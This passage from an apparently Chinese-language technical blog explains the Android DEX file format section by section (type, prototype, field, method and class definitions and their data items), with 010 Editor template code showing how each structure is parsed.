src="https://ws1.sinaimg.cn/large/006tKfTcly1fobah7zyq3j310m0hon4l.jpg" alt=""><br>根据<code>string_data_off</code>可以找到字符串的数据位置。<br><code>string_data</code>里存放字符串的大小和具体数据。<br><img src="https://ws3.sinaimg.cn/large/006tKfTcly1fobapdko3mj311e106ap7.jpg" alt=""></p><h2 id="type-ids"><a href="#type-ids" class="headerlink" title="type_ids"></a>type_ids</h2><p>type_ids 区索引了 dex 文件里的所有数据类型，包括 class 类型，数组类型(array types)和基本类型<br>(primitive types)。区段里的元素格式为 <code>type_ids_item</code><br><code>type_ids_item</code> 里面 <code>descriptor_idx</code> 的值的意思，是 <code>string_ids</code> 里的 index 序号，是用来描述此 type 的字符串。<br><img src="https://ws3.sinaimg.cn/large/006tKfTcly1fobatus0iyj30rs07u411.jpg" alt=""><br><img src="https://ws2.sinaimg.cn/large/006tKfTcly1fobau84mjuj30tm03wabf.jpg" alt=""><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">// type IDs</span></span><br><span class="line"><span class="comment">//////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    uint descriptor_idx &lt;read=StringIdRead, comment=<span class="string">"String ID for this type descriptor"</span>&gt;;</span><br><span class="line">&#125; type_id_item &lt;read=TypeIDRead, optimize=<span class="literal">false</span>&gt;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">TypeIDRead</span><span class="params">(type_id_item &amp;i)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> GetLongTypeDescriptor(GetStringById(i.descriptor_idx));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">struct</span> <span class="params">(<span class="keyword">int</span> size)</span> </span>&#123;</span><br><span class="line">    local <span class="keyword">int</span> s = size;</span><br><span class="line">    type_id_item type_id[size] &lt;comment=<span class="string">"Type ID"</span>&gt;;</span><br><span class="line">&#125; type_id_list &lt;read=TypeIDListRead&gt;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">TypeIDListRead</span><span class="params">(type_id_list &amp;l)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">string</span> s;</span><br><span class="line">    s = SPrintf(s, <span class="string">"%d types"</span>, l.s);</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">// type list</span></span><br><span class="line"><span class="comment">//////////////////////////////////////////////////</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    ushort type_idx &lt;comment=<span class="string">"Index into type_ids list"</span>&gt;;</span><br><span class="line">&#125; type_item;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    uint size &lt;comment=<span class="string">"Number of entries in type list"</span>&gt;;</span><br><span class="line">    type_item <span class="built_in">list</span>[size] &lt;read=TypeItemRead, comment=<span class="string">"Type entry"</span>&gt;;</span><br><span class="line">&#125; type_item_list &lt;read=TypeItemListRead, optimize=<span class="literal">false</span>&gt;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">TypeItemRead</span><span class="params">(type_item &amp;t)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> GetTypeById(t.type_idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">TypeItemListRead</span><span class="params">(type_item_list &amp;l)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">string</span> s = <span class="string">""</span>;</span><br><span class="line">    <span class="built_in">string</span> tmp;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; l.size; i++) &#123;</span><br><span class="line">        s += GetTypeById(l.<span class="built_in">list</span>[i].type_idx);</span><br><span class="line">        <span class="keyword">if</span>(i+<span class="number">1</span> &lt; l.size) &#123;</span><br><span class="line">            s += <span class="string">", "</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">GetLongTypeDescriptor</span><span class="params">(<span class="built_in">string</span> descriptor)</span> </span>&#123;</span><br><span class="line">    local <span class="built_in">string</span> desc = <span class="string">""</span>;</span><br><span class="line">    local <span class="built_in">string</span> post = <span class="string">""</span>;</span><br><span class="line">    local <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    local <span class="keyword">int</span> len = Strlen(descriptor);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// array descriptors</span></span><br><span class="line">    <span class="keyword">while</span>(descriptor[i] == <span class="string">'['</span>) &#123;</span><br><span class="line">        post += <span class="string">"[]"</span>;</span><br><span class="line">        i++;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(i &gt;= len) <span class="keyword">return</span> <span class="string">"ERROR"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(descriptor[i] == <span class="string">'L'</span>) &#123;</span><br><span class="line">        <span class="comment">// fully qualified class descriptors</span></span><br><span class="line">        i++;</span><br><span class="line">        <span class="keyword">while</span>(i &lt; len) &#123;</span><br><span class="line">            <span class="keyword">if</span>(descriptor[i] == <span class="string">'/'</span>) desc += <span class="string">"."</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(descriptor[i] == <span class="string">';'</span>) <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">else</span> desc += descriptor[i];</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// simple type descriptors</span></span><br><span class="line">        <span class="keyword">switch</span>(descriptor[i]) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'V'</span>: desc = <span class="string">"void"</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'Z'</span>: desc = <span class="string">"boolean"</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'B'</span>: desc = <span class="string">"byte"</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'S'</span>: desc = <span class="string">"short"</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'C'</span>: desc = <span class="string">"char"</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'I'</span>: desc = <span class="string">"int"</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'J'</span>: desc = <span class="string">"long"</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'F'</span>: desc = <span class="string">"float"</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'D'</span>: desc = <span class="string">"double"</span>; <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> desc + post;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="proto-ids"><a href="#proto-ids" class="headerlink" title="proto_ids"></a>proto_ids</h2><p>proto 的意思是 method prototype 代表 java 语言里的一个 method 的原型 。<code>proto_ids</code> 里的元素为 <code>proto_id_item</code>，结构如下:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">// protoypes</span></span><br><span class="line"><span class="comment">//////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    uint shorty_idx &lt;read=StringIdRead, comment=<span class="string">"String ID of short-form descriptor"</span>&gt;;</span><br><span class="line">    uint return_type_idx &lt;read=TypeIdRead, comment=<span class="string">"Type ID of the return type"</span>&gt;;</span><br><span class="line">    uint parameters_off &lt;comment=<span class="string">"File offset of parameter type list"</span>&gt;;</span><br><span class="line">   ....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><ul><li><code>shorty_idx</code>: 跟<code>type_ids</code> 一样，它的值是一个 <code>string_ids</code> 的 index 号 ，最终是一个简短的字符串描述，用来说明该 method 原型。</li><li><code>return_type_idx</code>: 它的值是一个 <code>type_ids</code> 的 index 号 ，表示该 method 原型的返回值类型。</li><li><code>parameters_off</code>: 指向 method 原型的参数列表 <code>type_list</code>，若 method 没有参数，值为0。<br>参数列表的格式是 <code>type_list</code>，下面会有描述。<br><img src="https://ws3.sinaimg.cn/large/006tKfTcly1fobbc9yqqcj31gc0jak32.jpg" alt=""></li></ul><h2 id="field-ids"><a href="#field-ids" class="headerlink" title="field_ids"></a>field_ids</h2><p><code>filed_ids</code> 区里面有 dex 文件引用的所有的 field。区段的元素格式是 <code>field_id_item</code>，结构如下:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">// fields</span></span><br><span class="line"><span class="comment">//////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    ushort class_idx &lt;read=LongTypeIdRead, comment=<span class="string">"Type ID of the class that defines this field"</span>&gt;;</span><br><span class="line">    ushort type_idx &lt;read=LongTypeIdRead, comment=<span class="string">"Type ID for the type of this field"</span>&gt;;</span><br><span class="line">    uint name_idx &lt;read=StringIdRead, comment=<span class="string">"String ID for the field's name"</span>&gt;;</span><br><span class="line">&#125; field_id_item &lt;read=FieldIdItemRead, optimize=<span class="literal">false</span>&gt;;</span><br></pre></td></tr></table></figure></p><ul><li><p><code>class_idx</code>: 表示 field 所属的 class 类型，class_idx 的值是 <code>type_ids</code> 的一个 index，并且必须指向一个 class 类型。</p></li><li><p><code>type_idx</code>: 表示本 field 的类型，它的值也是 <code>type_ids</code>的一个 index 。</p></li><li><p><code>name_idx</code>: 表示本 field 的名称，它的值是 <code>string_ids</code> 的一个 index 。</p></li></ul><h2 id="method-ids"><a href="#method-ids" class="headerlink" title="method_ids"></a>method_ids</h2><p><code>method_ids</code> 描述了 dex 文件里的所有的 method。<code>method_ids</code> 的元素格式是<code>method_id_item</code>，结构跟 fields_ids 很相似:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">// methods</span></span><br><span class="line"><span class="comment">//////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    ushort class_idx &lt;read=LongTypeIdRead, comment=<span class="string">"Type ID of the class that defines this method"</span>&gt;;</span><br><span class="line">    ushort proto_idx &lt;read=ProtoIdxRead, comment=<span class="string">"Prototype ID for this method"</span>&gt;;</span><br><span class="line">    uint name_idx &lt;read=StringIdRead, comment=<span class="string">"String ID for the method's name"</span>&gt;;</span><br><span class="line">&#125; method_id_item &lt;read=MethodIdItemRead, optimize=<span class="literal">false</span>&gt;;</span><br></pre></td></tr></table></figure></p><ul><li><code>class_idx</code>: 表示 method 所属的 class 类型，<code>class_idx</code> 的值是 <code>type_ids</code> 的一个 index，并且必须指向一个 class 类型。</li><li><code>proto_idx</code>: 表示 method 的类型，它的值也是 type_ids 的一个 index。</li><li><code>name_idx</code>: 表示 method 的名称，它的值是 string_ids 的一个 index。<br>都是索引，分别指向类型池，函数原型池，字符串池<br><img src="https://ws4.sinaimg.cn/large/006tKfTcly1fobbk6i570j30uo09w42d.jpg" alt=""></li></ul><h2 id="class-defs"><a href="#class-defs" class="headerlink" title="class_defs"></a>class_defs</h2><h3 id="概览"><a href="#概览" class="headerlink" title="概览"></a>概览</h3><ul><li><p><code>class_idx</code>: 描述具体的 class 类型，值是 <code>type_ids</code> 的一个 index 。值必须是一个 class 类型，不能是数组类型或者基本类型。</p></li><li><p><code>access_flags</code>: 描述 class 的访问类型，诸如 public , final , static 等。在 dex-format.html 里 “<code>access_flags</code> Definitions” 有具体的描述 。</p></li><li><p><code>superclass_idx</code>: 描述 supperclass 的类型，值的形式跟 <code>class_idx</code> 一样 。</p></li><li><p><code>interfaces_off</code>: 值为偏移地址，指向 class 的 interfaces，被指向的数据结构为 <code>type_list</code> 。class 若没有 interfaces,则值为 0。</p></li><li><p><code>source_file_idx</code>: 表示源代码文件的信息，值是 <code>string_ids</code> 的一个 index。若此项信息缺失，此项值赋值为 <code>NO_INDEX</code>=0xffff ffff。</p></li><li><p><code>annotions_off</code>: 值是一个偏移地址，指向的内容是该 class 的注释，位置在 data 区，格式为 <code>annotations_direcotry_item</code>。若没有此项内容，值为 0 。</p></li><li><p><code>class_data_off</code>: 值是一个偏移地址，指向的内容是该 class 的使用到的数据，位置在 data 区，格式为 <code>class_data_item</code>。若没有此项内容值为 0。该结构里有很多内容，详细描述该 class 的 field、method, method 里的执行代码等信息，后面会介绍 <code>class_data_item</code>。</p></li><li><p><code>static_value_off</code>: 值是一个偏移地址 ，指向 data 区里的一个列表 (list)，格式为 <code>encoded_array_item</code>。若没有此项内容值为 0。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    local int64 pos;</span><br><span class="line"></span><br><span class="line">    uint class_idx &lt;read=LongTypeIdRead, comment=<span class="string">"Type ID for this class"</span>&gt;;</span><br><span class="line">    ACCESS_FLAGS access_flags &lt;comment=<span class="string">"Access flags"</span>&gt;;</span><br><span class="line">    uint superclass_idx &lt;read=LongTypeIdRead, comment=<span class="string">"Type ID for this class's superclass"</span>&gt;; </span><br><span class="line"></span><br><span class="line">    uint interfaces_off &lt;comment=<span class="string">"File offset to interface list"</span>&gt;;</span><br><span class="line">    <span class="keyword">if</span>(interfaces_off != <span class="number">0</span>) &#123;</span><br><span class="line">        pos = FTell();</span><br><span class="line">        FSeek(odexpad + interfaces_off);</span><br><span class="line">        type_item_list interfaces &lt;read=InterfacesRead, comment=<span class="string">"Interface data"</span>&gt;;</span><br><span class="line">        FSeek(pos);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    uint source_file_idx &lt;read=StringIdRead, comment=<span class="string">"String ID for the name of the file with this class defined"</span>&gt;;</span><br><span class="line"></span><br><span class="line">    uint annotations_off &lt;comment=<span class="string">"File offset to the annotation structure for this class"</span>&gt;;</span><br><span class="line">    <span class="keyword">if</span>(annotations_off != <span class="number">0</span>) &#123;</span><br><span class="line">        pos = FTell();</span><br><span class="line">        FSeek(odexpad + annotations_off);</span><br><span class="line">        annotations_directory_item annotations &lt;comment=<span class="string">"Annotation data"</span>&gt;;</span><br><span class="line">        FSeek(pos);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    uint class_data_off &lt;comment=<span class="string">"File offset to the class data for this class"</span>&gt;;</span><br><span class="line">    <span class="keyword">if</span>(class_data_off != <span class="number">0</span>) &#123;</span><br><span class="line">        pos = FTell();</span><br><span class="line">        FSeek(odexpad + class_data_off);</span><br><span class="line">        class_data_item class_data &lt;comment=<span class="string">"Class data"</span>&gt;;</span><br><span class="line">        FSeek(pos);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    uint static_values_off &lt;comment=<span class="string">"File offset to static field data"</span>&gt;;</span><br><span class="line">    <span class="keyword">if</span>(static_values_off != <span class="number">0</span>) &#123;</span><br><span class="line">        pos = FTell();</span><br><span class="line">        FSeek(odexpad + static_values_off);</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">encoded_array_item</span> <span class="title">static_values</span> &lt;comment="Static values"&gt;;</span></span><br><span class="line">        FSeek(pos);        </span><br><span class="line">    &#125;</span><br><span class="line">&#125; class_def_item &lt;read=ClassDefItemRead, optimize=<span class="literal">false</span>&gt;;</span><br></pre></td></tr></table></figure></li></ul><h3 id="type-list"><a href="#type-list" class="headerlink" title="type_list"></a><code>type_list</code></h3><p><code>type_list</code> 在 data 区段，<code>class_def_item-&gt;interface_off</code> 就是指的这里的数据。数据结构如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">type_list</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    uint       size;</span><br><span class="line">    type_item  <span class="built_in">list</span> [size] </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">type_item</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ushort type_idx   <span class="comment">//--&gt;type_ids</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><ul><li>size: 表示类型个数</li><li><p><code>type_idx: 对应一个 type_ids 的 index</code></p><h3 id="annotations-directory-item"><a href="#annotations-directory-item" class="headerlink" title="annotations_directory_item"></a><code>annotations_directory_item</code></h3><p><code>class_def_item-&gt;annotations_off</code> 指向的数据区段，定义了 annotation 相关的数据描述，数据结构如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">annotation_directory_item</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    uint class_annotations_off;        <span class="comment">//--&gt;annotation_set_item</span></span><br><span class="line">    uint fields_size;</span><br><span class="line">    uint annotated_methods_size;</span><br><span class="line">    uint annotated_parameters_size;</span><br><span class="line">    </span><br><span class="line">    field_annotation field_annotations[fields_size];</span><br><span class="line">    method_annotation method_annotations[annotated_methods_size];</span><br><span class="line">    parameter_annotation parameter_annotations[annotated_parameters_size];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">field_annotation</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    uint field_idx;</span><br><span class="line">    uint annotations_off;    <span class="comment">//--&gt;annotation_set_item</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">method_annotation</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    uint method_idx;</span><br><span class="line">    uint annotations_off;    <span class="comment">//--&gt;annotation_set_item</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">parameter_annotation</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    uint method_idx;</span><br><span class="line">    uint annotations_off;    <span class="comment">//--&gt;annotation_set_ref_list</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><code>class_annotations_off</code>: 这个偏移指向了<code>annotation_set_item</code> </p></li><li><code>fields_size</code>: 表示属性的个数</li><li><code>annotated_methods_size</code>: 表示方法的个数</li><li><code>annotated_parameters_size</code>: 表示参数的个数</li></ul><h3 id="class-data-item"><a href="#class-data-item" class="headerlink" title="class_data_item"></a><code>class_data_item</code></h3><p><code>class_data_off</code> 指向 data 区里的 <code>class_data_item</code> 结构，<code>class_data_item</code> 里存放着本 class 使用到的各种数据，下面是 <code>class_data_item</code> 的结构 :<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    uleb128 static_fields_size &lt;comment=<span class="string">"The number of static fields"</span>&gt;;</span><br><span class="line">    uleb128 instance_fields_size &lt;comment=<span class="string">"The number of instance fields"</span>&gt;;</span><br><span class="line">    uleb128 direct_methods_size &lt;comment=<span class="string">"The number of direct methods"</span>&gt;;</span><br><span class="line">    uleb128 virtual_methods_size &lt;comment=<span class="string">"The number of virtual methods"</span>&gt;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(uleb128_value(static_fields_size) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        encoded_field_list static_fields(uleb128_value(static_fields_size)) &lt;comment="Encoded sequence of static fields"&gt;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(uleb128_value(instance_fields_size) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        encoded_field_list instance_fields(uleb128_value(instance_fields_size)) &lt;comment="Encoded sequence of instance fields"&gt;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(uleb128_value(direct_methods_size) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        encoded_method_list direct_methods(uleb128_value(direct_methods_size)) &lt;comment="Encoded sequence of direct methods"&gt;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(uleb128_value(virtual_methods_size) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        encoded_method_list virtual_methods(uleb128_value(virtual_methods_size)) &lt;comment="Encoded sequence of virtual methods"&gt;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; class_data_item &lt;read=ClassDataItemRead&gt;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// encoded fields</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">struct</span> <span class="params">(<span class="keyword">int</span> previd)</span> </span>&#123;</span><br><span class="line">    local <span class="keyword">int</span> p = previd;</span><br><span class="line"></span><br><span class="line">    uleb128 field_idx_diff &lt;comment=<span class="string">"Field ID for this field, represented as the difference from the previous index"</span>&gt;;</span><br><span class="line">    uleb128 access_flags &lt;read=AccessFlagsReadUleb, comment=<span class="string">"Access flags"</span>&gt;;</span><br><span class="line">&#125; encoded_field &lt;read=EncodedFieldRead, optimize=<span class="literal">false</span>&gt;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// encoded methods</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">struct</span> <span class="params">(<span class="keyword">int</span> previd)</span> </span>&#123;</span><br><span class="line">    local <span class="keyword">int</span> p = previd;</span><br><span class="line"></span><br><span class="line">    uleb128 method_idx_diff &lt;comment=<span class="string">"Method ID for this method, represented as the difference from the previous index"</span>&gt;;</span><br><span class="line">    uleb128 access_flags &lt;read=AccessFlagsReadUleb, comment=<span class="string">"Access flags"</span>&gt;;</span><br><span class="line">    uleb128 code_off &lt;comment=<span class="string">"File offset to the code for this method"</span>&gt;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(uleb128_value(code_off) != <span class="number">0</span>) &#123;</span><br><span class="line">        local int64 pos = FTell();</span><br><span class="line">        FSeek(odexpad + uleb128_value(code_off));</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">code_item</span> <span class="title">code</span> &lt;comment="Code structure for this method"&gt;;</span></span><br><span class="line">        FSeek(pos);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; encoded_method &lt;read=EncodedMethodRead, optimize=<span class="literal">false</span>&gt;;</span><br></pre></td></tr></table></figure></p><ul><li><code>static_fields_size</code>: 静态成员变量的个数</li><li><code>instance_fields_size</code>: 实例成员变量个数</li><li><code>direct_methods_size</code>: 直接函数个数</li><li><code>virtual_methods_size</code>: 虚函数个数<h4 id="encoded-methods"><a href="#encoded-methods" class="headerlink" title="encoded_methods"></a><code>encoded_methods</code></h4></li><li><code>access_flags</code>: 访问权限，比如 public、private、static、final 等。</li><li><code>code_off</code>: 一个指向 data 区的偏移地址，目标是本 method 的代码实现。被指向的结构是<code>code_item</code>，有近 10 项元素。<h4 id="code-item"><a href="#code-item" class="headerlink" title="code_item"></a><code>code_item</code></h4><code>code_item</code> 结构里描述着某个 method 